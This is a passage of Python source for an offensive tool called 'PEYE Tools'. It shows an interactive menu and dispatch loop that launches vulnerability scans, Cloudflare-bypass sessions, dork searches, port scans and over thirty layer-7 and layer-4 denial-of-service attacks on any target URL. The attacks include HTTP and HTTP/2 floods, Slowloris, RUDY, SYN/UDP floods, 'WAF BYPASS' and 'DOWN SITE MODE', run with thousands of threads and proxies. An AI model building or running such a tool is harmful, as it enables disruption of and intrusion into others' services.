        self.use_proxy = True
        self.dork = DorkSearch()
        self.ipinfo = IPInfo()
        self.portscanner = PortScanner()
        self.saa_enabled = False
    
    def menu(self):
        proxy_status = "ON" if self.use_proxy else "OFF"
        saa_status = "ON" if self.saa_enabled else "OFF"
        print(f"""
{YELLOW}╔══════════════════════════════════════════════════════════════════╗
║ {GREEN} PEYE Tools v{VERSION} (Proxy: {proxy_status} | SAA: {saa_status}){RESET}{YELLOW}                                ║
╠══════════════════════════════════════════════════════════════════╣
║ {MAGENTA}[📊 SCANNER - VULNERABILITY]{RESET}{YELLOW}                                          ║
║ {CYAN}[1] {WHITE}Full Vulnerability Scan                                                     ║
║ {CYAN}[2] {WHITE}XSS | SQLi | LFI | XXE | SSTI | XSLT | SSI/ESI                              ║
║ {CYAN}[3] {WHITE}CSRF | CORS | Clickjacking | OpenDir | Backup | Config | .env               ║
║ {CYAN}[4] {WHITE}Directory Bruteforce | Subdomain | Parameter | Endpoint                     ║
║ {CYAN}[5] {WHITE}403 Bypass Scanner                                                         ║
╠══════════════════════════════════════════════════════════════════╣
║ {MAGENTA}[🔍 DORK SEARCH]{RESET}{YELLOW}                                                    ║
║ {CYAN}[6] {WHITE}Search with Google Dork                                                     ║
║ {CYAN}[7] {WHITE}Search from dork.txt File                                                   ║
║ {CYAN}[8] {WHITE}Search by Technology                                                        ║
║ {CYAN}[9] {WHITE}Show Popular Dorks                                                         ║
╠══════════════════════════════════════════════════════════════════╣
║ {MAGENTA}[🛠️ EXTRA TOOLS]{RESET}{YELLOW}                                                    ║
║ {CYAN}[10] {WHITE}IP Information & Geolocation                                              ║
║ {CYAN}[11] {WHITE}Port Scanner                                                              ║
║ {CYAN}[12] {WHITE}CMS Detector                                                              ║
║ {CYAN}[13] {WHITE}SSL/TLS Checker                                                           ║
║ {CYAN}[14] {WHITE}HTTP Header Analyzer                                                      ║
║ {CYAN}[15] {WHITE}Check for Updates                                                         ║
╠══════════════════════════════════════════════════════════════════╣
║ {MAGENTA}[💥 DoS ATTACK - LAYER 7]{RESET}{YELLOW}                                                      ║
║ {CYAN}[16] HTTP GET          [17] HTTP POST         [18] HTTP HEAD                            ║
║ {CYAN}[19] HTTP PUT          [20] HTTP DELETE       [21] HTTP PATCH                           ║
║ {CYAN}[22] HTTP OPTIONS      [23] HTTP TRACE        [24] HTTP CONNECT                         ║
║ {CYAN}[25] HTTP RANDOM       [26] SLOW POST         [27] SLOW READ                            ║
║ {CYAN}[28] SLOWLORIS         [29] RUDY              [30] CACHE FLOOD                          ║
║ {CYAN}[31] WAF BYPASS        [32] XMLRPC                                                      ║
╠══════════════════════════════════════════════════════════════════╣
║ {MAGENTA}[💥 DoS ATTACK - LAYER 7 (HTTP/2)]{RESET}{YELLOW}                                                 ║
║ {CYAN}[33] HTTP/2 GET        [34] HTTP/2 POST       [35] HTTP/2 RAPID                         ║
║ {CYAN}[36] HTTP/2 PING                                                                       ║
╠══════════════════════════════════════════════════════════════════╣
║ {MAGENTA}[💥 DoS ATTACK - LAYER 4]{RESET}{YELLOW}                                                      ║
║ {CYAN}[37] TCP Flood         [38] UDP Flood         [39] SYN Flood (Root)                     ║
║ {CYAN}[40] ACK Flood (Root)  [41] FIN Flood (Root)  [42] RST Flood (Root)                     ║
║ {CYAN}[43] XMAS Flood (Root) [44] NULL Flood (Root) [45] Mixed Methods                        ║
║ {CYAN}[46] ALL ATTACKS       [47] DOWN SITE MODE                                              ║
╠══════════════════════════════════════════════════════════════════╣
║ {CYAN}[S] {WHITE}Toggle SAA (Slash Agg Anoying) - Current: {saa_status}                              ║
║ {CYAN}[P] {WHITE}Toggle Proxy (Current: {proxy_status})                                            ║
║ {CYAN}[U] {WHITE}Check & Update                                                                  ║
║ {CYAN}[0] {WHITE}Exit                                                                           ║
╚══════════════════════════════════════════════════════════════════╝{RESET}
""")
    
    def run(self):
        print_banner()
        
        while True:
            self.menu()
            choice = input(f"{GREEN}\n> {RESET}").upper()
            
            if choice == '0':
                sys.exit(0)
            
            if choice == 'P':
                self.use_proxy = not self.use_proxy
                print(f"{GREEN}[✓] Proxy: {'ON' if self.use_proxy else 'OFF'}{RESET}")
                time.sleep(1)
                os.system('clear')
                print_banner()
                continue
            
            if choice == 'S':
                self.saa_enabled = not self.saa_enabled
                print(f"{GREEN}[✓] SAA (Slash Agg Anoying): {'ON' if self.saa_enabled else 'OFF'}{RESET}")
                time.sleep(1)
                os.system('clear')
                print_banner()
                continue
            
            if choice == 'U':
                check_update()
                input(f"\n{YELLOW}Enter to continue{RESET}")
                os.system('clear')
                print_banner()
                continue
            
            # Scanner options
            if choice in ['1','2','3','4','5']:
                target = input(f"{GREEN}Target URL: {RESET}").strip()
                if not target.startswith(('http://','https://')):
                    target = 'http://' + target
                
                print(f"{YELLOW}[*] Connecting to {target}...{RESET}")
                session = CFBypass(target).bypass()
                scanner = AdvancedScanner(target, session)
                
                if choice == '1':
                    scanner.full_scan()
                elif choice == '2':
                    scanner.vuln_scan('XSS', scanner.wordlists.get('xss'), 'q', '<script>')
                    scanner.vuln_scan('SQLi', scanner.wordlists.get('sqli'), 'id', 'mysql|syntax')
                    scanner.vuln_scan('LFI', scanner.wordlists.get('lfi'), 'file', 'root:')
                    scanner.vuln_scan('XXE', scanner.wordlists.get('xxe'), 'xml', 'root:', method='POST')
                    scanner.ssti_scan()
                    scanner.xslt_scan()
                    scanner.ssi_esi_scan()
                    scanner.report.display()
                elif choice == '3':
                    scanner.scan_csrf()
                    scanner.scan_cors()
                    scanner.scan_clickjacking()
                    scanner.scan_opendir()
                    scanner.scan_backup()
                    scanner.scan_config()
                    scanner.scan_env()
                    scanner.report.display()
                elif choice == '4':
                    scanner.dir_scan()
                    domain = urlparse(target).netloc
                    scanner.subdomain_scan(domain)
                    scanner.scan_parameters()
                    scanner.scan_endpoints()
                    scanner.report.display()
                elif choice == '5':
                    scanner.bypass403_scan()
                    scanner.report.display()
            
            # Dork search options
            elif choice in ['6','7','8']:
                target_url = input(f"{GREEN}Target URL/Domain: {RESET}").strip()
                self.dork.set_target(target_url)
                
                if choice == '6':
                    dork = input(f"{GREEN}Enter Google Dork: {RESET}")
                    self.dork.search_google(dork)
                elif choice == '7':
                    self.dork.search_from_file()
                elif choice == '8':
                    tech = input(f"{GREEN}Enter technology: {RESET}")
                    self.dork.tech_search(tech)
            
            elif choice == '9':
                self.dork.popular_dorks()
            
            # Extra Tools
            elif choice == '10':
                target = input(f"{GREEN}Target (domain or IP): {RESET}").strip()
                self.ipinfo.get_ip_info(target)
            
            elif choice == '11':
                target = input(f"{GREEN}Target IP: {RESET}").strip()
                self.portscanner.scan(target)
            
            elif choice == '12':
                target = input(f"{GREEN}Target URL: {RESET}").strip()
                if not target.startswith(('http://','https://')):
                    target = 'http://' + target
                session = CFBypass(target).bypass()
                detector = CMSDetector(target, session)
                detector.detect()
            
            elif choice == '13':
                target = input(f"{GREEN}Target (domain): {RESET}").strip()
                try:
                    ctx = ssl.create_default_context()
                    with ctx.wrap_socket(socket.socket(), server_hostname=target) as sock:
                        sock.connect((target, 443))
                        cert = sock.getpeercert()
                        print(f"{GREEN}[✓] SSL Certificate Info:{RESET}")
                        print(f"    Issuer: {cert.get('issuer', 'N/A')}")
                        print(f"    Subject: {cert.get('subject', 'N/A')}")
                        print(f"    Expiry: {cert.get('notAfter', 'N/A')}")
                except:
                    print(f"{RED}[✗] Could not get SSL info{RESET}")
            
            elif choice == '14':
                target = input(f"{GREEN}Target URL: {RESET}").strip()
                if not target.startswith(('http://','https://')):
                    target = 'http://' + target
                try:
                    resp = requests.get(target, timeout=10, verify=False)
                    print(f"{GREEN}[✓] HTTP Headers:{RESET}")
                    for key, value in resp.headers.items():
                        print(f"    {key}: {value}")
                except:
                    print(f"{RED}[✗] Could not fetch headers{RESET}")
            
            elif choice == '15':
                check_update()
            
            # DoS Attack options
            elif choice in [str(i) for i in range(16, 48)]:
                target = input(f"{GREEN}Target URL: {RESET}").strip()
                if not target.startswith(('http://','https://')):
                    target = 'http://' + target
                
                dur = int(input(f"{YELLOW}Duration (s): {RESET}"))
                thr = int(input(f"{YELLOW}Threads (100-5000): {RESET}"))
                dos = DoSAttack(target, self.use_proxy)
                
                if self.saa_enabled:
                    dos.enable_saa()
                
                attack_map = {
                    '16': dos.http_get, '17': dos.http_post, '18': dos.http_head,
                    '19': dos.http_put, '20': dos.http_delete, '21': dos.http_patch,
                    '22': dos.http_options, '23': dos.http_trace, '24': dos.http_connect,
                    '25': dos.http_random, '26': dos.slow_post, '27': dos.slow_read,
                    '28': dos.slowloris, '29': dos.rudy, '30': dos.cache_flood,
                    '31': dos.waf_bypass, '32': dos.xmlrpc, '33': dos.h2_get,
                    '34': dos.h2_post, '35': dos.h2_rapid, '36': dos.h2_ping,
                    '37': dos.tcp_flood, '38': dos.udp_flood, '39': dos.syn_flood,
                    '40': dos.ack_flood, '41': dos.fin_flood, '42': dos.rst_flood,
                    '43': dos.xmas_flood, '44': dos.null_flood, '45': dos.mixed_flood,
                    '46': dos.all_attacks, '47': dos.down_site
                }
                if choice in attack_map:
                    attack_map[choice](dur, min(thr, 5000))
            
            input(f"\n{YELLOW}Enter{RESET}")
            os.system('clear')
            print_banner()

if __name__ == "__main__":
    try:
        import cloudscraper
    except:
        os.system('pip install cloudscraper')
    peye = Peye()
    peye.run()
